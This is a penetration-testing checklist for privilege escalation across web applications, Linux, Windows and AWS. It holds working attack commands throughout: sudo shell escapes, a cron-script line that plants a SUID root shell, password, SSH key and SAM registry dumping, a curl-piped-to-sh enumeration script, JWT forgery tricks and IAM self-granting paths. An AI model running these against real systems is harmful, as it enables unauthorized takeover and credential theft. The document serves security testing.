# Privilege Escalation Checklist

## Overview
After gaining initial access (via web exploit, credential theft, or shell), privilege escalation is the next goal. This checklist covers web application privilege escalation, Linux privesc, Windows privesc, and cloud/AWS escalation.

---

## Web Application Privilege Escalation

### Horizontal escalation (same role → different user)
- [ ] IDOR on user-specific endpoints (`/api/users/{id}`)
- [ ] Swap session tokens/cookies between accounts
- [ ] Modify `user_id`, `email`, or `account_id` in requests
- [ ] Test GraphQL queries with different user identifiers
- [ ] Check WebSocket messages for user-specific data

### Vertical escalation (low role → admin)
- [ ] Mass assignment: add `role=admin`, `is_admin=true`, `is_staff=1` to POST/PUT requests
- [ ] Access admin endpoints directly (`/admin`, `/dashboard`, `/internal`)
- [ ] Modify JWT claims (`role`, `admin`, `groups`)
- [ ] Force browse to admin functionality (change URL paths)
- [ ] Check if admin API endpoints lack authorization checks
- [ ] Test parameter tampering on role/permission fields
- [ ] Check for exposed admin registration endpoints

### Token/session manipulation
- [ ] JWT algorithm confusion (RS256 → HS256, algorithm: none)
- [ ] JWT key injection (embedded JWK in header)
- [ ] Session fixation (force victim to use attacker's session)
- [ ] Cookie manipulation (change role/user values in cookies)
- [ ] OAuth redirect_uri manipulation for token theft

---

## Linux Privilege Escalation

### Quick wins
```bash
# Current user and groups
id
whoami
groups

# Sudo permissions
sudo -l                  # What can you run as root?

# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Writable /etc/passwd
ls -la /etc/passwd /etc/shadow

# Kernel version (for kernel exploits)
uname -a
cat /etc/os-release
```

### SUID exploitation
```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Check GTFOBins for exploitation:
# https://gtfobins.github.io/

# Common exploitable SUID binaries:
# vim, find, nmap, python, perl, ruby, bash, env, less, more
```

### Sudo abuse
```bash
sudo -l
# Look for:
# (ALL) NOPASSWD: /usr/bin/vim → sudo vim -c '!sh'
# (ALL) NOPASSWD: /usr/bin/find → sudo find . -exec /bin/sh \;
# (ALL) NOPASSWD: /usr/bin/python3 → sudo python3 -c 'import os; os.system("/bin/sh")'
# (ALL) NOPASSWD: /usr/bin/env → sudo env /bin/sh
# env_keep+=LD_PRELOAD → shared library injection
```

### Cron jobs
```bash
# Check cron jobs
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# Check for writable scripts called by cron
# If a root cron job runs /opt/script.sh and you can write to it:
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/script.sh
# Wait for cron → /tmp/rootbash -p → root shell
```

### Writable files and directories
```bash
# World-writable directories
find / -writable -type d 2>/dev/null

# Writable files owned by root
find / -writable -user root -type f 2>/dev/null

# Config files with credentials
find / -name "*.conf" -o -name "*.config" -o -name "*.ini" -o -name ".env" 2>/dev/null | xargs grep -l "password\|passwd\|secret\|key" 2>/dev/null
```

### Capabilities
```bash
# Check capabilities
getcap -r / 2>/dev/null

# Exploitable capabilities:
# cap_setuid → set UID to 0 (root)
# cap_dac_read_search → read any file
# cap_net_bind_service → bind to privileged ports
```

### Kernel exploits
```bash
uname -r
# Search for kernel exploits:
# searchsploit linux kernel [version]
# https://github.com/lucyoa/kernel-exploits

# Common ones:
# Dirty COW (CVE-2016-5195) — Linux < 4.8.3
# PwnKit (CVE-2021-4034) — pkexec (most Linux distros)
# Dirty Pipe (CVE-2022-0847) — Linux 5.8 - 5.16.11
```

### Password hunting
```bash
# Search for passwords in files
grep -r "password" /home /var /etc /opt 2>/dev/null
grep -r "passwd" /home /var /etc /opt 2>/dev/null
find / -name "*.txt" -exec grep -l "password" {} \; 2>/dev/null

# History files
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.psql_history

# SSH keys
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
```

### Automated enumeration tools
```bash
# LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
./LinEnum.sh

# linux-exploit-suggester
./linux-exploit-suggester.sh
```

---

## Windows Privilege Escalation

### Quick wins
```cmd
whoami /all
whoami /priv
net user
net localgroup administrators
systeminfo
```

### Token privileges
```cmd
whoami /priv
# Exploitable privileges:
# SeImpersonatePrivilege → Potato attacks (JuicyPotato, PrintSpoofer, GodPotato)
# SeAssignPrimaryTokenPrivilege → Token manipulation
# SeBackupPrivilege → Read any file
# SeRestorePrivilege → Write any file
# SeDebugPrivilege → Inject into any process
# SeTakeOwnershipPrivilege → Take ownership of any object
```

### Service exploitation
```cmd
# Check services with weak permissions
sc qc ServiceName
accesschk.exe -uwcqv "Everyone" *
accesschk.exe -uwcqv "Authenticated Users" *

# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# Modifiable service binary
# Replace service binary with reverse shell → restart service
```

### Scheduled tasks
```cmd
schtasks /query /fo LIST /v
# Look for tasks running as SYSTEM with writable script paths
```

### Credential hunting
```cmd
# Saved credentials
cmdkey /list
dir /s /b C:\Users\*.txt C:\Users\*.ini C:\Users\*.cfg 2>nul | findstr /i "password"

# Registry
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s

# SAM dump (if accessible)
reg save HKLM\SAM sam
reg save HKLM\SYSTEM system
```

### Automated tools
```
# WinPEAS
winpeas.exe

# PowerUp
. .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt
Seatbelt.exe -group=all
```

---

## Cloud (AWS) Privilege Escalation

### IAM enumeration
```bash
aws sts get-caller-identity
aws iam list-users
aws iam list-roles
aws iam list-attached-user-policies --user-name USERNAME
aws iam list-user-policies --user-name USERNAME
aws iam get-user-policy --user-name USERNAME --policy-name POLICY
```

### Common AWS privesc paths
| Path | How |
|------|-----|
| `iam:CreatePolicyVersion` | Create new policy version with admin permissions |
| `iam:AttachUserPolicy` | Attach `AdministratorAccess` to yourself |
| `iam:PutUserPolicy` | Add inline admin policy to yourself |
| `iam:CreateLoginProfile` | Create console login for IAM user |
| `iam:UpdateLoginProfile` | Change another user's password |
| `iam:PassRole` + `lambda:CreateFunction` | Create Lambda with admin role |
| `iam:PassRole` + `ec2:RunInstances` | Launch EC2 with admin role |
| `sts:AssumeRole` | Assume a more privileged role |
| `ssm:SendCommand` | Execute commands on EC2 instances |

### Automated AWS enumeration
```bash
# Enumerate all permissions
aws iam simulate-principal-policy --policy-source-arn ARN --action-names "*"

# Pacu (AWS exploitation framework)
python3 pacu.py
> run iam__enum_permissions
> run iam__privesc_scan

# ScoutSuite (cloud audit)
python3 scout.py aws
```

## References

- `methodology/exploitation-methodology.md`
- `methodology/bug-bounty-playbook.md`
- `techniques/idor-insecure-direct-object-reference.md`
- `techniques/mass-assignment-vulnerabilities.md`
- `techniques/jwt-attacks-and-misconfigurations.md`
